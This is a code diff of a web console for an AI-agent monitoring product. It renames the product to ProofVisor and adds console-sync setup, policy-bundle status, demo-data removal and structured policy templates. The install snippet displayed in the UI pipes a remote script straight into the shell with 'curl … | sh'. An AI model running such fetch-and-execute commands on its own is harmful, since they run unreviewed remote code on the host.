-        "<br/>Verify this receipt offline at <b>agentvisorai.me/verify</b> — paste the downloaded receipt JSON; the Ed25519 signature check runs in the browser, no account needed." +
+        "<br/>Verify this receipt offline at <b>proofvisor.com/verify</b> — paste the downloaded receipt JSON; the Ed25519 signature check runs in the browser, no account needed." +
       "</div>";
 
     // event click → drawer. Selection is mirrored into the hash as
@@ -2891,7 +3004,7 @@
     });
 
     // Share receipt: encode the full bundle into a URL fragment and
-    // copy the resulting agentvisorai.me/verify/#data=<...> to the
+    // copy the resulting proofvisor.com/verify/#data=<...> to the
     // clipboard. Recipient opens the link -> auto-verifies in their
     // own browser. Fragment (not query) so the payload never touches
     // any server.
@@ -2903,8 +3016,16 @@
       var bin = "";
       for (var i = 0; i < bytes.length; i++) bin += String.fromCharCode(bytes[i]);
       var b64 = btoa(bin).replace(/\+/g, "-").replace(/\//g, "_").replace(/=+$/, "");
-      var origin = window.VERIFY_BASE || "https://agentvisorai.me";
+      var origin = window.VERIFY_BASE || "https://proofvisor.com";
       var url = origin + "/verify/#data=" + b64;
+      // Trust anchor: name the deployment (and, in live mode, the API
+      // that pinned its key) so the verifier can say "signed by the key
+      // the console pinned for deployment X" instead of only "internally
+      // consistent". The verifier only consults api origins it trusts.
+      if (s.deploymentId) {
+        url += "&deployment=" + encodeURIComponent(s.deploymentId);
+        if (state.ds.mode === "api") url += "&api=" + encodeURIComponent(consoleApiOrigin());
+      }
       // Warn if it's really big. Many chat clients cap URLs around 8k.
       if (url.length > 32000) {
         toast("Receipt too large to share as a URL (" + url.length + " bytes). Use Download instead.", true);
@@ -2925,7 +3046,7 @@
     // both the Download and Share buttons so the recipient of either
     // gets the same shape as the offline verifier expects.
     // Version-accurate signed-message description for the exported
-    // bundle's human instructions (mirrors av-receipts
+    // bundle's human instructions (mirrors pv-receipts
     // signing_message and verify.js receiptSigningMessage).
     function receiptMessageInstruction(rcpt) {
       var version = 1;
@@ -2940,7 +3061,7 @@
     }
     function buildReceiptBundle(sess, rcpt) {
       return {
-        format: "agentvisor.receipt.v1",
+        format: "proofvisor.receipt.v1",
         exportedAt: new Date().toISOString(),
         session: {
           id: sess.id,
@@ -2970,7 +3091,7 @@
           signature: "base64-decode(receipt.rawSignatureB64)",
           publicKey: "hex-decode(publicKey.hex)",
           command: "node tools/verify-receipt.mjs " + (sess.externalId || sess.id) + ".json",
-          docs: "https://agentvisorai.me/reference/receipts",
+          docs: "https://proofvisor.com/reference/receipts",
         },
       };
     }
@@ -2987,7 +3108,7 @@
       var url = URL.createObjectURL(blob);
       var a = document.createElement("a");
       a.href = url;
-      a.download = "agentvisor-receipt-" + (s.externalId || s.id) + ".json";
+      a.download = "proofvisor-receipt-" + (s.externalId || s.id) + ".json";
       document.body.appendChild(a);
       a.click();
       a.remove();
@@ -3038,6 +3159,16 @@
         sub: ev.sub === REDACT_D ? "[hidden for member role]" : ev.sub,
         policy: ev.policyId,
       }, null, 2)) + "</pre>";
+    } else if (ev.msg === REDACT_D) {
+      payload = '<div class="empty-mini">Payload hidden for the member role.</div>';
+    } else if (ev.msg) {
+      // Live events: the body is what the daemon journaled for this
+      // step (the uploader serialises the ATIF step as JSON). Show it
+      // pretty-printed when it parses, verbatim otherwise — never a
+      // synthesised prompt/response.
+      var shown = ev.msg;
+      try { shown = JSON.stringify(JSON.parse(ev.msg), null, 2); } catch (e) { /* plain text body */ }
+      payload = '<pre class="payload">' + esc(shown) + (ev.sub && ev.sub !== REDACT_D ? "\n\n" + esc(ev.sub) : "") + "</pre>";
     } else {
       payload = '<div class="empty-mini">No payload attached.</div>';
     }
@@ -3100,11 +3231,11 @@
   async function applyReceiptVerification(r) {
     var head = document.querySelector('.receipt-head[data-verify-state="pending"]');
     if (!head) return;
-    if (!window.avVerifyReceipt) return;
+    if (!window.pvVerifyReceipt) return;
     // R117 F1: server redacts receipt.body + sigB64 to
     // '[redacted-member-view]' for member-role callers so the
     // signed JSON's cost.cost_usd_micros doesn't leak. Skip the
-    // verifier here — otherwise avVerifyReceipt returns
+    // verifier here — otherwise pvVerifyReceipt returns
     // {supported:true, ok:false} on the sentinel and the head
     // flips to "Signature INVALID", which is UX-misleading (the
     // signature isn't invalid, it's simply not visible to
@@ -3121,7 +3252,7 @@
       if (subR) subR.textContent = "Ask an admin for signed-receipt access.";
       return;
     }
-    var res = await window.avVerifyReceipt(r.publicKeyHex, r.rawSignatureB64, r.rawBody);
+    var res = await window.pvVerifyReceipt(r.publicKeyHex, r.rawSignatureB64, r.rawBody);
     var check = head.querySelector('.check');
     var title = head.querySelector('.title');
     var sub = head.querySelector('div > div:last-child');
@@ -3168,9 +3299,10 @@
           ? '<span class="pill ok status-dot">connected</span>'
           : '<span class="pill neutral status-dot">' + esc(d.status) + "</span>";
         return '<tr data-clickable data-id="' + esc(d.id) + '" data-nav="#/deployments/" tabindex="0">' +
-          '<td><div style="font-weight:500">' + esc(d.name) + '</div><div class="id">' + esc(d.id) + "</div></td>" +
+          '<td><div style="font-weight:500">' + esc(d.name) + (d.isDemo ? demoPill() : "") + '</div><div class="id">' + esc(d.id) + "</div></td>" +
           '<td><span class="pill neutral">' + esc(d.environment) + "</span></td>" +
           "<td>" + statusPill + "</td>" +
+          "<td>" + bundlePill(d) + "</td>" +
           '<td class="mono">' + esc(d.version || "—") + "</td>" +
           '<td style="color: var(--fg-2)">' + timeAgoCell(d.lastSeenAt) + "</td>" +
           '<td>' +
@@ -3183,11 +3315,11 @@
       body =
         '<div class="empty-hero" style="margin-bottom: 16px; padding: 16px 20px; grid-template-columns: 1fr 1fr;">' +
           '<div><h2 style="font-size: 15px; margin: 0 0 4px">Connect a new daemon</h2>' +
-          '<p style="margin: 0; font-size: 13px">Install <code>agentvisord</code> on your infra with the ingest token, and events start streaming here.</p></div>' +
-          '<div class="snippet"><span class="prompt">$</span> <span class="cmd">curl -fsSL https://agentvisorai.me/install.sh | sh</span>\n<span class="prompt">$</span> <span class="cmd">avctl setup</span></div>' +
+          '<p style="margin: 0; font-size: 13px">Install <code>proofvisord</code> on your infra with the ingest token, and events start streaming here.</p></div>' +
+          '<div class="snippet"><span class="prompt">$</span> <span class="cmd">curl -fsSL https://proofvisor.com/install.sh | sh</span>\n<span class="prompt">$</span> <span class="cmd">pvctl setup</span></div>' +
         "</div>" +
         '<div class="card" style="padding:0"><div class="table-wrap"><table>' +
-          "<thead><tr><th>Deployment</th><th>Environment</th><th>Status</th><th>Version</th><th>Last seen</th><th class=\"act-3\"><span class=\"sr-only\">Actions</span></th></tr></thead>" +
+          "<thead><tr><th>Deployment</th><th>Environment</th><th>Status</th><th>Policies</th><th>Version</th><th>Last seen</th><th class=\"act-3\"><span class=\"sr-only\">Actions</span></th></tr></thead>" +
           "<tbody>" + rows + "</tbody></table></div></div>";
     }
     main.innerHTML = pageHeader("Deployments", "Each daemon streams events and signed receipts to this console.", actions) + body;
@@ -3220,7 +3352,7 @@
               onConfirm: function () {
                 state.ds.rotateDeploymentToken(id).then(function (r) {
                   showTokenModal(r.ingestToken, "Token rotated", {
-                    subtitle: "Store this token in your secret manager — it's shown only once. It links your daemon to this console (the AV_INGEST_TOKEN control-plane hookup ships with the beta; tokens minted now stay valid).",
+                    subtitle: "Store this token in your secret manager — it's shown only once. Set it as PV_CONSOLE_TOKEN (with PV_CONSOLE_URL and PV_CONSOLE_DEPLOYMENT from the deployment page) and run `pvctl console-sync --watch` on the host that runs your agent.",
                     notice: "The previous ingest token is invalidated immediately; every daemon using it will fail to connect until you swap the value.",
                   });
                 })
@@ -3241,13 +3373,23 @@
     restoreScrollFor(location.hash);
   }
 
+  // Origin `pvctl console-sync` should post to. In live mode this is the
+  // API the console itself talks to (window.API_BASE, or the page origin
+  // when the API is served alongside the SPA); the demo shows the hosted
+  // API. console-sync appends /api/v1/ingest itself.
+  function consoleApiOrigin() {
+    if (window.MOCK_MODE) return "https://api.proofvisor.com";
+    var base = (window.API_BASE || "").replace(/\/+$/, "");
+    return base || location.origin;
+  }
+
   function deploymentEmptyHero() {
     return '<div class="empty-hero">' +
       '<div><h2>Connect your first agent</h2>' +
-      '<p>Install the AgentVisor daemon on the box that runs your agent. Once it starts, sessions and signed receipts stream directly into this console.</p>' +
+      '<p>Install the ProofVisor daemon on the box that runs your agent. Once it starts, sessions and signed receipts stream directly into this console.</p>' +
       '<button class="btn accent" id="addDep2">+ New deployment</button> ' +
-      '<button type="button" class="btn" data-copy="curl -fsSL https://agentvisorai.me/install.sh | sh\navctl setup">⧉ Copy install commands</button></div>' +
-      '<div class="snippet"><span class="prompt">$</span> <span class="cmd">curl -fsSL https://agentvisorai.me/install.sh | sh</span>\n\n<span class="prompt">$</span> <span class="cmd">avctl setup</span></div>' +
+      '<button type="button" class="btn" data-copy="curl -fsSL https://proofvisor.com/install.sh | sh\npvctl setup">⧉ Copy install commands</button></div>' +
+      '<div class="snippet"><span class="prompt">$</span> <span class="cmd">curl -fsSL https://proofvisor.com/install.sh | sh</span>\n\n<span class="prompt">$</span> <span class="cmd">pvctl setup</span></div>' +
       "</div>";
   }
 
@@ -3263,13 +3405,21 @@
     var statusPill = d.status === "connected"
       ? '<span class="pill ok status-dot">connected</span>'
       : '<span class="pill neutral status-dot">' + esc(d.status) + "</span>";
+    var consoleSyncEnv =
+      "PV_CONSOLE_URL=" + consoleApiOrigin() + "\n" +
+      "PV_CONSOLE_DEPLOYMENT=" + d.id + "\n" +
+      "PV_CONSOLE_TOKEN=<token shown once at create or rotate>\n" +
+      // Same path as policy_bundle_file in the daemon's config; pvctl
+      // reads it for --pull-policies.
+      "PV_POLICY_BUNDLE_FILE=/var/lib/proofvisor/policies.json";
 
     main.innerHTML =
-      pageHeader(d.name, d.environment, '<a href="' + esc(backToListUrl("deployments")) + '" class="btn">← All deployments</a>') +
+      pageHeader(d.name, d.environment + (d.isDemo ? " · demo deployment staged by Simulate an attack" : ""), '<a href="' + esc(backToListUrl("deployments")) + '" class="btn">← All deployments</a>') +
       '<div class="dep-summary">' +
-        depCell("Status", statusPill, false, true) +
+        depCell("Status", statusPill + (d.isDemo ? demoPill() : ""), false, true) +
         depCell("Version", d.version || "—", true) +
         depCell("Last seen", timeAgoCell(d.lastSeenAt), false, true) +
+        depCell("Policy bundle", bundlePill(d), false, true) +
         depCell("Sessions (24h)", d.sessions24h != null ? d.sessions24h : "—") +
         depCell("Spend (24h)", d.spend24h || "—") +
       "</div>" +
@@ -3279,7 +3429,7 @@
           '<dt style="color:var(--fg-3)">Fingerprint</dt><dd class="mono">' + copyable(d.keyFingerprint) + "</dd>" +
           '<dt style="color:var(--fg-3)">Public key</dt><dd class="mono" style="word-break:break-all">' + copyable(d.publicKeyHex) + "</dd>" +
           // No copy button here: the hint is a redacted placeholder
-          // ("av_live_9HpD…") — copying it pastes garbage. The full
+          // ("pv_live_9HpD…") — copying it pastes garbage. The full
           // token is only shown once, at create/rotate.
           '<dt style="color:var(--fg-3)">Ingest token</dt><dd class="mono">' + esc(d.ingestTokenHint) + ' <span style="color:var(--fg-3);font-size:11px">(full token shown once at create/rotate)</span></dd>' +
         "</dl>" +
@@ -3289,23 +3439,27 @@
         "</div>" +
       "</div>" +
       // "Now what?" — the first question after creating a deployment.
-      // A copyable env block that points a daemon at this workspace.
-      // Honesty rule (R275, same class as the token modals): the
-      // hosted ingest hookup ships with the beta — the daemon reads
-      // these AV_INGEST_* vars then; ingest.agentvisorai.me has no DNS
-      // yet, and "connected within a few seconds" was a promise no
-      // real deployment could keep today.
-      '<div class="card" style="margin-bottom:12px">' +
-        "<h2>Connect your daemon</h2>" +
-        '<p style="color:var(--fg-2); font-size:var(--t-sec); margin:0 0 10px">Store these with your secrets now — the daemon picks them up when the hosted control-plane link lands with the beta, and this page flips to <b>connected</b>. Tokens you mint today stay valid.</p>' +
-        '<pre class="policy-body" style="margin:0 0 10px; user-select:all">' +
-          "AV_INGEST_URL=https://ingest.agentvisorai.me/v1   # live with the beta\n" +
-          "AV_DEPLOYMENT=" + esc(d.id) + "\n" +
-          "AV_INGEST_TOKEN=" + esc(d.ingestTokenHint || "av_live_…") + "  # full token shown once at create/rotate" +
-        "</pre>" +
-        '<button type="button" class="btn" data-copy="AV_INGEST_URL=https://ingest.agentvisorai.me/v1\nAV_DEPLOYMENT=' + esc(d.id) + '\nAV_INGEST_TOKEN=<your-token>">⧉ Copy env block</button>' +
-        '<span style="margin-left:10px; color:var(--fg-3); font-size:11.5px">Lost the token? Rotate below — the old one stops working immediately.</span>' +
-      "</div>" +
+      // A copyable env block for `pvctl console-sync`, the uploader that
+      // ships with the CLI: it reads PV_CONSOLE_URL, PV_CONSOLE_DEPLOYMENT
+      // and PV_CONSOLE_TOKEN (crates/pv-cli/src/console_sync.rs), appends
+      // /api/v1/ingest to the URL itself, and posts the daemon's spooled
+      // sessions, events and receipts here. The displayed text and the
+      // clipboard payload are the same string so what you read is what
+      // you paste; the token placeholder is never a redacted hint.
+      (d.isDemo
+        ? '<div class="card" style="margin-bottom:12px">' +
+            "<h2>Demo deployment</h2>" +
+            '<p style="color:var(--fg-2); font-size:var(--t-sec); margin:0 0 10px">This deployment and its sessions were staged by <b>⚡ Simulate an attack</b>. No daemon runs behind it: the receipts are signed with the <b>public demo key</b>, so the verifier shows them as demo receipts, never as production attestations. Remove it when you are done showing the flow.</p>' +
+            '<button type="button" class="btn danger" id="depRemoveDemo">Remove demo data</button>' +
+          "</div>"
+        : '<div class="card" style="margin-bottom:12px">' +
+            "<h2>Connect your daemon</h2>" +
+            '<p style="color:var(--fg-2); font-size:var(--t-sec); margin:0 0 10px">On the host that runs <code>proofvisord</code>, add <code>policy_bundle_file = "/var/lib/proofvisor/policies.json"</code> to its config, export these and start the uploader with <code>pvctl console-sync --watch --pull-policies</code>. It posts the daemon\'s spooled sessions, events and signed receipts to this console and pulls the org\'s enabled policies as one bundle; this page flips to <b>connected</b> after the first upload.</p>' +
+            '<pre class="policy-body" style="margin:0 0 10px; user-select:all">' + esc(consoleSyncEnv) + "</pre>" +
+            '<button type="button" class="btn" data-copy="' + esc(consoleSyncEnv) + '">⧉ Copy env block</button>' +
+            '<span style="margin-left:10px; color:var(--fg-3); font-size:11.5px">The token is shown once, at create or rotate. Lost it? Rotate below — the old one stops working immediately.</span>' +
+          "</div>" +
+          policyBundleCard(d)) +
       '<div class="card" style="padding:0">' +
         '<div style="padding:12px 16px; border-bottom: 1px solid var(--border); display:flex; align-items:baseline; gap:8px;">' +
           '<h2 style="margin:0; font-size:var(--t-section); font-weight:600">Recent sessions</h2>' +
@@ -3324,7 +3478,7 @@
         onConfirm: function () {
           state.ds.rotateDeploymentToken(d.id).then(function (r) {
             showTokenModal(r.ingestToken, "Token rotated", {
-              subtitle: "Store this token in your secret manager — it's shown only once. It links your daemon to this console (the AV_INGEST_TOKEN control-plane hookup ships with the beta; tokens minted now stay valid).",
+              subtitle: "Store this token in your secret manager — it's shown only once. Set it as PV_CONSOLE_TOKEN (with PV_CONSOLE_URL and PV_CONSOLE_DEPLOYMENT from the deployment page) and run `pvctl console-sync --watch` on the host that runs your agent.",
               notice: "The previous ingest token is invalidated immediately; every daemon using it will fail to connect until you swap the value.",
             });
           })
@@ -3337,6 +3491,52 @@
       // R126 F1 / R127 F1: shared helper handles the cascade
       // copy + 409 deployment_has_sealed_receipts force flow.
       openDeleteDeploymentModal(d.id, function () { navigate("#/deployments"); });
+    });
+    on("#depRemoveDemo", "click", function () { openRemoveDemoModal(function () { navigate("#/deployments"); }); });
+  }
+
+  // The policy bundle a daemon last applied (GET /api/v1/deployments →
+  // policyBundle), with the exact command that enables pulling.
+  function policyBundleCard(d) {
+    var b = d.policyBundle;
+    var how = '<p style="color:var(--fg-2); font-size:var(--t-sec); margin:10px 0 0">Policies reach this daemon through the uploader: set <code>policy_bundle_file = "/var/lib/proofvisor/policies.json"</code> in the daemon\'s config (the same path as <code>PV_POLICY_BUNDLE_FILE</code> in the env block above) and run <code>pvctl console-sync --watch --pull-policies</code>. It fetches <code>GET /api/v1/ingest/policies</code> (the org\'s enabled policies as one bundle, identified by an etag) and writes it to that file; the daemon applies it, and pvctl reports back what the daemon enforces.</p>';
+    var body;
+    if (!b) {
+      body = '<p style="color:var(--fg-2); font-size:var(--t-sec); margin:0">' +
+        '<span class="pill neutral">not pulling</span> This daemon has not pulled a policy bundle yet, so it enforces only its local policy files.</p>' + how;
+    } else {
+      var unsupported = (b.unsupported || []);
+      body = '<dl class="kv kv-grid">' +
+        '<dt style="color:var(--fg-3)">Applied bundle</dt><dd class="mono" style="word-break:break-all">' + esc(b.etag) + (b.stale ? ' <span class="pill warn">older bundle</span>' : ' <span class="pill ok">current</span>') + "</dd>" +
+        '<dt style="color:var(--fg-3)">Applied</dt><dd>' + timeAgoCell(b.appliedAt) + "</dd>" +
+        '<dt style="color:var(--fg-3)">Policies enforced</dt><dd>' + esc(b.applied != null ? b.applied : "—") + "</dd>" +
+        (b.daemonVersion ? '<dt style="color:var(--fg-3)">Daemon</dt><dd class="mono">' + esc(b.daemonVersion) + "</dd>" : "") +
+        "</dl>" +
+        (b.stale ? '<p style="color:var(--fg-2); font-size:var(--t-sec); margin:10px 0 0">The org\'s policies changed since this daemon last pulled. It picks the new bundle up on its next <code>console-sync</code> pass.</p>' : "") +
+        (unsupported.length
+          ? '<p style="color:var(--fg-2); font-size:var(--t-sec); margin:10px 0 4px"><b>Not enforced by this daemon:</b></p><ul style="margin:0; padding-left:18px; font-size:var(--t-sec); color:var(--fg-2)">' +
+            unsupported.map(function (u) { return "<li><code>" + esc(u.id) + "</code> — " + esc(u.reason || "unsupported") + "</li>"; }).join("") + "</ul>"
+          : "") +
+        how;
+    }
+    return '<div class="card" style="margin-bottom:12px"><h2>Policy bundle</h2>' + body + "</div>";
+  }
+
+  // "Remove demo data": deletes the demo-attack deployment with its
+  // sessions and receipts (DELETE /api/v1/demo; the mock drops its
+  // staged sessions). Owner/admin only — the server refuses members.
+  function openRemoveDemoModal(onDone) {
+    if (typeof state.ds.removeDemoData !== "function") return;
+    confirmModal({
+      title: "Remove demo data?",
+      body: "This deletes the demo-attack deployment and every staged session, event and demo-signed receipt under it. Real deployments and sessions are untouched.",
+      confirmLabel: "Remove demo data", danger: true,
+      onConfirm: function () {
+        state.ds.removeDemoData().then(function (r) {
+          toast("Demo data removed" + (r && r.sessionsRemoved != null ? " (" + r.sessionsRemoved + " session" + (r.sessionsRemoved === 1 ? "" : "s") + ")" : ""));
+          if (onDone) onDone(); else render();
+        }).catch(function (err) { toast((err && err.message) || "Could not remove demo data", true); });
+      },
     });
   }
   // R127 F1: shared confirm-and-delete flow for a deployment.
@@ -3502,7 +3702,7 @@
         .then(function (r) {
           close();
           showTokenModal(r.ingestToken, "Deployment created", {
-            subtitle: "Store this token in your secret manager — it's shown only once. It links your daemon to this console (the AV_INGEST_TOKEN control-plane hookup ships with the beta; tokens minted now stay valid).",
+            subtitle: "Store this token in your secret manager — it's shown only once. Set it as PV_CONSOLE_TOKEN (with PV_CONSOLE_URL and PV_CONSOLE_DEPLOYMENT from the deployment page) and run `pvctl console-sync --watch` on the host that runs your agent.",
             notice: "If you lose the token, rotate to mint a new one from the deployment's detail page; the current value stops being accepted immediately.",
           });
         })
@@ -3572,66 +3772,210 @@
   /* ── Policy creation. Template-driven: pick what to protect, tune
    *    one parameter, watch the DSL write itself. ───────────────── */
 
+  /* Policy kinds. The four enforceable ones carry a JSON spec that
+   * daemons apply verbatim (see pvValidatePolicySpec in datasource.js
+   * for the shapes — the same validation the server runs). guardrail
+   * and transform are free text: documentation and event attribution,
+   * not something a daemon can enforce. */
+  var POLICY_KIND_INFO = {
+    budget: { label: "Budget", enforceable: true, blurb: "Caps on tool calls, payout and tokens for a session." },
+    allowlist: { label: "Tool allowlist", enforceable: true, blurb: "Which tools an agent may (or may never) call." },
+    rate: { label: "Rate limit", enforceable: true, blurb: "Token velocity per principal inside a time window." },
+    schema: { label: "Tool schema", enforceable: true, blurb: "A JSON Schema every call of one tool must satisfy." },
+    guardrail: { label: "Guardrail", enforceable: false, blurb: "Documentation only — daemons do not enforce it." },
+    transform: { label: "Transform", enforceable: false, blurb: "Documentation only — daemons do not enforce it." },
+  };
+  function kindEnforceable(kind) {
+    return window.pvIsEnforceableKind ? window.pvIsEnforceableKind(kind) : !!(POLICY_KIND_INFO[kind] && POLICY_KIND_INFO[kind].enforceable);
+  }
+  function validateSpec(kind, scope, body) {
+    if (window.pvValidatePolicySpec) return window.pvValidatePolicySpec(kind, scope, body);
+    return { ok: true, spec: null };
+  }
+  function parseSpec(p) {
+    if (p && p.spec && typeof p.spec === "object") return p.spec;
+    if (!kindEnforceable(p && p.kind)) return null;
+    try { var v = JSON.parse(p.body || ""); return v && typeof v === "object" ? v : null; } catch (e) { return null; }
+  }
+  function toolList(v) {
+    return String(v || "").split(/[,\n]/).map(function (t) { return t.trim(); }).filter(Boolean);
+  }
+  function toolListText(arr) { return Array.isArray(arr) ? arr.join(", ") : ""; }
+
+  // Structured fields per enforceable kind. `specFields` renders the
+  // inputs prefilled from `spec`; `readSpecFields` turns them back into
+  // the JSON object (or an error) the body stores.
+  function specFields(kind, spec) {
+    spec = spec || {};
+    function num(id, label, value, hint, min) {
+      return '<div class="field"><label for="' + id + '">' + esc(label) + '</label><input id="' + id + '" type="number" inputmode="numeric" min="' + (min == null ? 0 : min) + '" step="1" value="' + (value == null ? "" : esc(String(value))) + '" />' + (hint ? '<div style="color:var(--fg-3); font-size:11.5px; margin-top:4px">' + esc(hint) + "</div>" : "") + "</div>";
+    }
+    function text(id, label, value, hint, placeholder) {
+      return '<div class="field"><label for="' + id + '">' + esc(label) + '</label><input id="' + id + '" type="text" value="' + esc(value || "") + '" placeholder="' + esc(placeholder || "") + '" />' + (hint ? '<div style="color:var(--fg-3); font-size:11.5px; margin-top:4px">' + esc(hint) + "</div>" : "") + "</div>";
+    }
+    if (kind === "budget") {
+      var perTool = spec.per_tool_max_calls ? Object.keys(spec.per_tool_max_calls).map(function (t) { return t + "=" + spec.per_tool_max_calls[t]; }).join("\n") : "";
+      return '<div class="spec-grid">' +
+        num("sf_payout", "Max payout per session (USD)", spec.max_payout_usd_micros != null ? spec.max_payout_usd_micros / 1e6 : "", "Stored as max_payout_usd_micros. Leave empty for no payout cap.") +
+        num("sf_calls", "Max tool calls per session", spec.max_total_tool_calls, "Leave empty for no call cap.") +
+        num("sf_tokens", "Max tokens per session", spec.max_tokens, "Prompt + completion tokens. Leave empty for no token cap.") +
+        '<div class="field"><label for="sf_pertool">Per-tool call caps</label><textarea id="sf_pertool" rows="3" spellcheck="false" placeholder="create_payment=1&#10;http_request=20">' + esc(perTool) + '</textarea><div style="color:var(--fg-3); font-size:11.5px; margin-top:4px">One tool=count per line; optional.</div></div>' +
+        "</div>";
+    }
+    if (kind === "allowlist") {
+      return text("sf_allow", "Allow only these tools", toolListText(spec.allow_only), "Comma-separated tool names. Every other tool is blocked.", "search_inventory, lookup_vendor") +
+        text("sf_deny", "Always deny these tools", toolListText(spec.deny_tools), "Comma-separated; optional. Denied even if allowed above.", "delete_records");
+    }
+    if (kind === "rate") {
+      return '<div class="spec-grid">' +
+        num("sf_rate_tokens", "Max tokens per window", spec.max_tokens_per_window, "Per principal (agent identity).", 1) +
+        num("sf_rate_window", "Window (seconds)", spec.window_s != null ? spec.window_s : 3600, "3600 = one hour.", 1) +
+        "</div>";
+    }
+    if (kind === "schema") {
+      var js = spec.json_schema ? JSON.stringify(spec.json_schema, null, 2) : "";
+      return text("sf_tool", "Tool", spec.tool, "Every call of this tool must match the schema below.", "create_purchase_order") +
+        '<div class="field"><label for="sf_schema">JSON Schema for the call arguments</label><textarea id="sf_schema" rows="8" spellcheck="false" style="font-family:var(--mono, ui-monospace, monospace);font-size:12.5px">' + esc(js) + "</textarea></div>";
+    }
+    return "";
+  }
+  function readSpecFields(kind, root) {
+    function val(id) { var el = root.querySelector("#" + id); return el ? el.value : ""; }
+    function intOrNull(id, label, min) {
+      var raw = val(id).trim();
+      if (raw === "") return { v: null };
+      var n = Number(raw);
+      if (!isFinite(n) || Math.floor(n) !== n || n < (min == null ? 0 : min)) return { err: label + " must be a whole number" + (min ? " of at least " + min : "") + "." };
+      return { v: n };
+    }
+    if (kind === "budget") {
+      var spec = {};
+      var payoutRaw = val("sf_payout").trim();
+      if (payoutRaw !== "") {
+        var usd = Number(payoutRaw);
+        if (!isFinite(usd) || usd < 0) return { error: "Max payout must be a non-negative amount in USD." };
+        spec.max_payout_usd_micros = Math.round(usd * 1e6);
+      }
+      var c = intOrNull("sf_calls", "Max tool calls"); if (c.err) return { error: c.err }; if (c.v != null) spec.max_total_tool_calls = c.v;
+      var t = intOrNull("sf_tokens", "Max tokens"); if (t.err) return { error: t.err }; if (t.v != null) spec.max_tokens = t.v;
+      var lines = val("sf_pertool").split("\n").map(function (l) { return l.trim(); }).filter(Boolean);
+      if (lines.length) {
+        spec.per_tool_max_calls = {};
+        for (var i = 0; i < lines.length; i++) {
+          var m = /^([^=\s]+)\s*=\s*(\d+)$/.exec(lines[i]);
+          if (!m) return { error: 'Per-tool caps: "' + lines[i] + '" is not tool=count.' };
+          spec.per_tool_max_calls[m[1]] = parseInt(m[2], 10);
+        }
+      }
+      return { spec: spec };
+    }
+    if (kind === "allowlist") {
+      var out = {};
+      var allow = toolList(val("sf_allow")); if (allow.length) out.allow_only = allow;
+      var deny = toolList(val("sf_deny")); if (deny.length) out.deny_tools = deny;
+      return { spec: out };
+    }
+    if (kind === "rate") {
+      var r1 = intOrNull("sf_rate_tokens", "Max tokens per window", 1); if (r1.err) return { error: r1.err };
+      var r2 = intOrNull("sf_rate_window", "Window", 1); if (r2.err) return { error: r2.err };
+      return { spec: { max_tokens_per_window: r1.v == null ? undefined : r1.v, window_s: r2.v == null ? undefined : r2.v } };
+    }
+    if (kind === "schema") {
+      var tool = val("sf_tool").trim();
+      var schemaText = val("sf_schema").trim();
+      var schema;
+      if (schemaText) {
+        try { schema = JSON.parse(schemaText); } catch (e) { return { error: "JSON Schema is not valid JSON: " + e.message }; }
+      }
+      return { spec: { tool: tool || undefined, json_schema: schema } };
+    }
+    return { spec: null };
+  }
+  function specBodyText(spec) { return JSON.stringify(spec, null, 2); }
+
+  /* Templates: pick what to protect, tune one parameter, and the JSON
+   * spec (or guardrail text) writes itself. */
   var POLICY_TEMPLATES = [
     {
       id: "spend_cap",
       label: "💸 Spend cap",
-      hint: "Block any payment above a dollar limit",
+      hint: "Cap the payout a single session may authorize",
       kind: "budget",
-      scope: "tool.create_payment",
-      param: { label: "Maximum per payment (USD)", type: "number", value: "500", min: 1 },
+      scope: "tool.*",
+      param: { label: "Maximum payout per session (USD)", type: "number", value: "500", min: 1 },
       build: function (v) {
         var n = Math.max(1, parseInt(v, 10) || 500);
         return {
-          name: "finance.payment_cap_usd:" + n,
-          description: "Block any single payment above $" + n.toLocaleString() + " USD.",
-          body: [
-            'policy "finance.payment_cap_usd:' + n + '" {',
-            '  applies_to = tool("create_payment")',
-            "  when { arg.amount_usd > " + n + " }",
-            "  effect = block",
-            '  reason = "Payment of {{arg.amount_usd}} USD exceeds the $' + n + ' cap."',
-            "}",
-          ].join("\n"),
+          name: "finance.payout_cap_usd:" + n,
+          description: "Block any tool call that would push a session's payout above $" + n.toLocaleString() + " USD.",
+          spec: { max_payout_usd_micros: n * 1000000 },
         };
       },
     },
     {
       id: "vendor_allowlist",
       label: "🏷 Vendor allowlist",
-      hint: "Only named vendors can receive orders",
-      kind: "allowlist",
+      hint: "Only named vendors can receive purchase orders",
+      kind: "schema",
       scope: "tool.create_purchase_order",
       param: { label: "Allowed vendors (comma-separated)", type: "text", value: "Contoso, Fabrikam" },
       build: function (v) {
-        var vendors = String(v || "").split(",").map(function (s) { return s.trim(); }).filter(Boolean);
+        var vendors = toolList(v).map(function (x) { return x.replace(/["\\]/g, ""); });
         if (!vendors.length) vendors = ["Contoso"];
-        var list = vendors.map(function (s) { return '"' + s.replace(/["\\]/g, "") + '"'; }).join(", ");
         return {
           name: "procurement.vendors:" + vendors.length,
           description: "Purchase orders may only go to: " + vendors.join(", ") + ".",
-          body: [
-            'policy "procurement.vendors:' + vendors.length + '" {',
-            '  applies_to = tool("create_purchase_order")',
-            "  when { arg.vendor not in [" + list + "] }",
-            "  effect = block",
-            '  reason = "Vendor {{arg.vendor}} is not on the allowlist."',
-            "}",
-          ].join("\n"),
+          spec: {
+            tool: "create_purchase_order",
+            json_schema: { type: "object", required: ["vendor"], properties: { vendor: { type: "string", enum: vendors } } },
+          },
+        };
+      },
+    },
+    {
+      id: "tool_allowlist",
+      label: "🧰 Tool allowlist",
+      hint: "Agents may only call the tools you name",
+      kind: "allowlist",
+      scope: "tool.*",
+      param: { label: "Allowed tools (comma-separated)", type: "text", value: "search_inventory, lookup_vendor, create_purchase_order" },
+      build: function (v) {
+        var tools = toolList(v).filter(function (t) { return /^[A-Za-z0-9_.:\/-]{1,80}$/.test(t); });
+        if (!tools.length) tools = ["search_inventory"];
+        return {
+          name: "runtime.tool_allowlist:" + tools.length,
+          description: "Agents may only call: " + tools.join(", ") + ". Every other tool is blocked.",
+          spec: { allow_only: tools },
+        };
+      },
+    },
+    {
+      id: "token_rate",
+      label: "⏱ Token rate limit",
+      hint: "Slow a runaway agent down",
+      kind: "rate",
+      scope: "llm.request",
+      param: { label: "Maximum tokens per hour, per principal", type: "number", value: "200000", min: 1 },
+      build: function (v) {
+        var n = Math.max(1, parseInt(v, 10) || 200000);
+        return {
+          name: "llm.token_velocity:" + n,
+          description: "No principal may push more than " + n.toLocaleString() + " tokens through the model per hour.",
+          spec: { max_tokens_per_window: n, window_s: 3600 },
         };
       },
     },
     {
       id: "pii_guard",
       label: "🔒 PII egress guard",
